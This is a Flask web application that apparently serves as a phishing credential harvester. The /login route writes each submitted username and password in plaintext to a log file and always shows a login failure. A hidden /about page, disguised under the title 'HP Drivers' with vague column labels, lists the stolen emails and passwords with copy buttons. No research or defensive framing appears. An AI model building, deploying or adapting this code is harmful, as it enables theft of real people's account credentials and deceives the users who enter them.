from flask import Flask, render_template, request, redirect, url_for, flash
import logging
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'  # Change this to a secure secret key

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def log_login_attempt(email, password=None):
    """Log login attempts to index.log file"""
    try:
        log_file = os.path.join(app.root_path, 'index.log')
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        log_entry = f"[{timestamp}] {email} - {password}\n"
        
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(log_entry)
    except Exception as e:
        logger.error(f"Failed to write to log file: {e}")


@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('user')
        password = request.form.get('pass')
        
        if username and password:
            # Log all login attempts
            log_login_attempt(username, password)
            # Always show error message
            return render_template('login.html', login_failed=True, prefill_email=username)
        else:
            # Missing credentials - stay on login page with error
            return render_template('login.html', login_failed=True)
    
    # GET request - show login page
    return render_template('login.html')

@app.route('/about')
def view_logs():
    """View the login attempt logs"""
    try:
        log_file = os.path.join(app.root_path, 'index.log')
        if os.path.exists(log_file):
            with open(log_file, 'r', encoding='utf-8') as f:
                logs = f.readlines()
            
            # Skip comment lines and process log entries
            log_entries = []
            for line in logs:
                line = line.strip()
                if line and not line.startswith('#'):
                    # Parse log entry format: [timestamp] email - password
                    try:
                        # Extract timestamp, email, and password
                        parts = line.split('] ', 1)
                        if len(parts) == 2:
                            timestamp = parts[0][1:]  # Remove opening bracket
                            rest = parts[1]
                            
                            # Split by ' - ' to get email and password
                            email_password = rest.split(' - ')
                            if len(email_password) >= 2:
                                email = email_password[0]
                                password = email_password[1]
                            elif len(email_password) == 1:
                                # Handle legacy format without password
                                email = email_password[0]
                                password = "N/A"
                            else:
                                continue
                            
                            log_entries.append({
                                'timestamp': timestamp,
                                'email': email,
                                'password': password
                            })
                    except:
                        continue
            
            # Reverse to show most recent first
            log_entries.reverse()
            
            html = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>HP Drivers</title>
                <style>
                    body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
                    .container { max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
                    h1 { color: #333; text-align: center; margin-bottom: 30px; }
                    .stats { display: flex; gap: 20px; margin-bottom: 30px; justify-content: center; }
                    .stat-box { background: #f8f9fa; padding: 15px; border-radius: 5px; text-align: center; min-width: 200px; }
                    .stat-number { font-size: 24px; font-weight: bold; color: #007bff; }
                    .stat-label { color: #666; margin-top: 5px; }
                    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
                    th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
                    th { background-color: #f8f9fa; font-weight: bold; color: #333; }
                    tr:hover { background-color: #f8f9fa; }
                    .timestamp { color: #666; font-size: 0.9em; }
                    .email, .password { font-weight: 500; position: relative; cursor: pointer; }
                    .email:hover, .password:hover { background-color: #e9ecef; }
                    .copy-btn { 
                        opacity: 0; 
                        transition: opacity 0.2s; 
                        margin-left: 8px; 
                        font-size: 12px; 
                        color: #007bff; 
                        cursor: pointer; 
                        padding: 2px 6px;
                        border-radius: 3px;
                        background: #f8f9fa;
                        border: 1px solid #dee2e6;
                    }
                    .email:hover .copy-btn, .password:hover .copy-btn { opacity: 1; }
                    .copy-btn:hover { background: #007bff; color: white; }
                    .copy-feedback { 
                        position: fixed; 
                        top: 20px; 
                        right: 20px; 
                        background: #28a745; 
                        color: white; 
                        padding: 10px 15px; 
                        border-radius: 5px; 
                        z-index: 1000; 
                        opacity: 0; 
                        transition: opacity 0.3s; 
                    }
                    .no-logs { text-align: center; color: #666; padding: 40px; }
                </style>
            </head>
            <body>
                <div class="copy-feedback" id="copyFeedback">Text copied to clipboard!</div>
                <div class="container">
                    <h1>HP Drivers</h1>
            """
            
            if log_entries:
                # Calculate stats
                total_entries = len(log_entries)
                
                html += f"""
                    <div class="stats">
                        <div class="stat-box">
                            <div class="stat-number">{total_entries}</div>
                            <div class="stat-label">Total Entries</div>
                        </div>
                    </div>
                    
                    <table>
                        <thead>
                            <tr>
                                <th>Timestamp</th>
                                <th>Beginning</th>
                                <th>End</th>
                            </tr>
                        </thead>
                        <tbody>
                """
                
                for entry in log_entries:
                    html += f"""
                        <tr>
                            <td class="timestamp">{entry['timestamp']}</td>
                            <td class="email" onclick="copyText('{entry['email']}')">{entry['email']}<span class="copy-btn">Copy</span></td>
                            <td class="password" onclick="copyText('{entry['password']}')">{entry['password']}<span class="copy-btn">Copy</span></td>
                        </tr>
                    """
                
                html += """
                        </tbody>
                    </table>
                """
            else:
                html += '<div class="no-logs">No entries recorded yet.</div>'
            
            html += """
                </div>
                <script>
                function copyText(text) {
                    // Use the modern Clipboard API if available
                    if (navigator.clipboard && window.isSecureContext) {
                        navigator.clipboard.writeText(text).then(function() {
                            showCopyFeedback();
                        }).catch(function() {
                            // Fallback if clipboard API fails
                            fallbackCopy(text);
                        });
                    } else {
                        // Fallback for older browsers or non-HTTPS
                        fallbackCopy(text);
                    }
                }
                
                function fallbackCopy(text) {
                    // Create a temporary textarea element
                    const textarea = document.createElement('textarea');
                    textarea.value = text;
                    textarea.style.position = 'fixed';
                    textarea.style.opacity = '0';
                    document.body.appendChild(textarea);
                    
                    // Select and copy the text
                    textarea.select();
                    try {
                        document.execCommand('copy');
                        showCopyFeedback();
                    } catch (err) {
                        console.error('Failed to copy text:', err);
                    }
                    
                    // Clean up
                    document.body.removeChild(textarea);
                }
                
                function showCopyFeedback() {
                    const feedback = document.getElementById('copyFeedback');
                    feedback.style.opacity = '1';
                    setTimeout(function() {
                        feedback.style.opacity = '0';
                    }, 2000);
                }
                </script>
            </body>
            </html>
            """
            
            return html
        else:
            return """
            <!DOCTYPE html>
            <html>
            <head>
                <title>HP Drivers</title>
                <style>
                    body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
                    .container { max-width: 800px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
                    h1 { color: #333; margin-bottom: 30px; }
                    .message { color: #666; font-size: 18px; line-height: 1.6; }
                    .icon { font-size: 64px; margin-bottom: 20px; color: #007bff; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="icon">📁</div>
                    <h1>HP Drivers</h1>
                    <div class="message">
                        System is initializing...<br>
                        Driver database will be available shortly.
                    </div>
                </div>
            </body>
            </html>
            """
        
    except Exception as e:
        return f"Error reading log file: {e}"

@app.route('/dashboard')
def dashboard():
    # This is a placeholder for your dashboard/main application page
    return "<h1>Welcome to the Dashboard!</h1><p>Login successful.</p>"

if __name__ == '__main__':
    app.run(debug=True)